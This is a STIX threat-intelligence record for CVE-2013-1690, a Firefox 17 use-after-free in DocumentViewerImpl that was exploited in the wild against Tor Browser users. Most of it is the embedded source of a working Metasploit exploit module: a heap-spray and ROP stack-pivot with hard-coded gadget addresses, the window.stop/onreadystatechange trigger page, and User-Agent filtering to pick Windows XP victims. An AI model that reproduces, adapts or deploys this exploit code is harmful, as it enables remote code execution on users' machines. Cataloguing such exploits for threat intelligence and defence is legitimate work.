{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--87ccab21-b45f-4ee8-9d76-dc3e1cd2dbd2",
    "created": "2024-08-14T16:43:38.122528Z",
    "modified": "2024-08-14T16:43:38.122533Z",
    "name": "Firefox onreadystatechange Event DocumentViewerImpl Use After Free",
    "description": " This module exploits a vulnerability found on Firefox 17.0.6, specifically a use after free of a DocumentViewerImpl object, triggered via a specially crafted web page using onreadystatechange events and the window.stop() API, as exploited in the wild on 2013 August to target Tor Browser users.  'License'        => MSF_LICENSE",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/exploits/windows/browser/mozilla_firefox_onreadystatechange.rb",
            "external_id": "mozilla_firefox_onreadystatechange.rb"
        },
        {
            "source_name": "CVE",
            "external_id": "2013-1690"
        },
        {
            "source_name": "reference",
            "url": "https://www.mozilla.org/security/announce/2013/mfsa2013-53.html"
        },
        {
            "source_name": "reference",
            "url": "https://lists.torproject.org/pipermail/tor-announce/2013-August/000089.html"
        },
        {
            "source_name": "reference",
            "url": "https://bugzilla.mozilla.org/show_bug.cgi?id=901365"
        },
        {
            "source_name": "reference",
            "url": "http://krash.in/ffn0day.txt"
        },
        {
            "source_name": "reference",
            "url": "http://hg.mozilla.org/releases/mozilla-esr17/rev/2d5a85d7d3ae"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nclass MetasploitModule < Msf::Exploit::Remote\n  Rank = NormalRanking\n\n  include Msf::Exploit::Remote::HttpServer::HTML\n  include Msf::Exploit::RopDb\n\n  def initialize(info = {})\n    super(update_info(info,\n      'Name'           => 'Firefox onreadystatechange Event DocumentViewerImpl Use After Free',\n      'Description'    => %q{\n        This module exploits a vulnerability found on Firefox 17.0.6, specifically a use\n        after free of a DocumentViewerImpl object, triggered via a specially crafted web\n        page using onreadystatechange events and the window.stop() API, as exploited in the\n        wild on 2013 August to target Tor Browser users.\n      },\n      'License'        => MSF_LICENSE,\n      'Author'         =>\n        [\n          'Nils',        # vulnerability discovery\n          'Unknown',     # 1day exploit, prolly the FBI\n          'w3bd3vil',    # 1day analysis\n          'sinn3r',      # Metasploit module\n          'juan vazquez' # Metasploit module\n        ],\n      'References'     =>\n        [\n          [ 'CVE', '2013-1690' ],\n          [ 'OSVDB', '94584'],\n          [ 'BID', '60778'],\n          [ 'URL', 'https://www.mozilla.org/security/announce/2013/mfsa2013-53.html' ],\n          [ 'URL', 'https://lists.torproject.org/pipermail/tor-announce/2013-August/000089.html' ],\n          [ 'URL', 'https://bugzilla.mozilla.org/show_bug.cgi?id=901365' ],\n          [ 'URL', 'http://krash.in/ffn0day.txt' ],\n          [ 'URL', 'http://hg.mozilla.org/releases/mozilla-esr17/rev/2d5a85d7d3ae' ]\n        ],\n      'DefaultOptions' =>\n        {\n          'EXITFUNC' => 'process',\n          'InitialAutoRunScript' => 'post/windows/manage/priv_migrate'\n        },\n      'Payload'        =>\n        {\n          'BadChars'       => \"\\x00\",\n          'DisableNops'    => true\n        },\n      'Platform'       => 'win',\n      'Targets'        =>\n        [\n          [ 'Firefox 17 & Firefox 21 / Windows XP SP3',\n            {\n              'FakeObject' => 0x0c101008, # Pointer to the Sprayed Memory\n              'RetGadget'  => 0x77c3ee16, # ret from msvcrt\n              'StackPivot' => 0x76C9B4C2, # xcht ecx,esp # or byte ptr[eax], al # add byte ptr [edi+5Eh], bl # ret 8 from IMAGEHLP\n              'VFuncPtr'   => 0x0c10100c  # Fake Function Pointer to the Sprayed Memory\n            }\n          ]\n        ],\n      'DisclosureDate' => '2013-06-25',\n      'DefaultTarget'  => 0))\n\n  end\n\n  def stack_pivot\n    pivot = \"\\x64\\xa1\\x18\\x00\\x00\\x00\"  # mov eax, fs:[0x18 # get teb\n    pivot << \"\\x83\\xC0\\x08\"             # add eax, byte 8 # get pointer to stacklimit\n    pivot << \"\\x8b\\x20\"                 # mov esp, [eax] # put esp at stacklimit\n    pivot << \"\\x81\\xC4\\x30\\xF8\\xFF\\xFF\" # add esp, -2000 # plus a little offset\n    return pivot\n  end\n\n  def junk(n=4)\n    return rand_text_alpha(n).unpack(\"V\").first\n  end\n\n  def on_request_uri(cli, request)\n    agent = request.headers['User-Agent']\n    vprint_status(\"Agent: #{agent}\")\n\n    if agent !~ /Windows NT 5\\.1/\n      print_error(\"Windows XP not found, sending 404: #{agent}\")\n      send_not_found(cli)\n      return\n    end\n\n    unless agent =~ /Firefox\\/(17|21)/\n      print_error(\"Browser not supported, sending 404: #{agent}\")\n      send_not_found(cli)\n      return\n    end\n\n    my_uri = ('/' == get_resource[-1,1]) ? get_resource[0, get_resource.length-1] : get_resource\n\n    # build html\n    code = [\n      target['VFuncPtr'],\n      target['RetGadget'],\n      target['StackPivot'],\n      junk\n    ].pack(\"V*\")\n    code << generate_rop_payload('msvcrt', stack_pivot + payload.encoded, {'target'=>'xp'})\n    js_code = Rex::Text.to_unescape(code, Rex::Arch.endian(target.arch))\n    js_random = Rex::Text.to_unescape(rand_text_alpha(4), Rex::Arch.endian(target.arch))\n\n    content = <<-HTML\n<html>\n<body>\n<iframe src=\"#{my_uri}/iframe.html\"></iframe>\n</body></html>\n    HTML\n\n    # build iframe\n    iframe = <<-IFRAME\n<script>\nvar z=\"<body><img src='nonexistant.html' onerror=\\\\\"\\\\\" ></body>\";\nvar test = new Array();\nvar heap_chunks;\nfunction heapSpray(shellcode, fillsled) {\n  var chunk_size, headersize, fillsled_len, code;\n  var i, codewithnum;\n  chunk_size = 0x40000;\n  headersize = 0x10;\n  fillsled_len = chunk_size - (headersize + shellcode.length);\n  while (fillsled.length <fillsled_len)\n    fillsled += fillsled;\n  fillsled = fillsled.substring(0, fillsled_len);\n  code = shellcode + fillsled;\n  heap_chunks = new Array();\n  for (i = 0; i<1000; i++)\n  {\n    codewithnum = \"HERE\" + code;\n    heap_chunks[i] = codewithnum.substring(0, codewithnum.length);\n  }\n}\n\n\nfunction b() {\n  for(var c=0;1024>c;c++) {\n    test[c]=new ArrayBuffer(180);\n    bufView = new Uint32Array(test[c]);\n    for (var i=0; i < 45; i++) {\n      bufView[i] = #{target['FakeObject']};\n    }\n  }\n}\n\nfunction a() {\n  window.stop();\n  var myshellcode = unescape(\"#{js_code}\");\n  var myfillsled = unescape(\"#{js_random}\");\n  heapSpray(myshellcode,myfillsled);\n  b();\n  window.parent.frames[0].frameElement.ownerDocument.write(z);\n}\n\ndocument.addEventListener(\"readystatechange\",a,null);\n</script>\n    IFRAME\n\n    print_status(\"URI #{request.uri} requested...\")\n\n    if request.uri =~ /iframe\\.html/\n      print_status(\"Sending iframe HTML\")\n      send_response(cli, iframe, {'Content-Type'=>'text/html'})\n      return\n    end\n\n    print_status(\"Sending HTML\")\n    send_response(cli, content, {'Content-Type'=>'text/html'})\n\n  end\nend\n",
    "x_mitre_disclosure_date": "2013-06-25",
    "x_mitre_platforms": [
        "win'"
    ]
}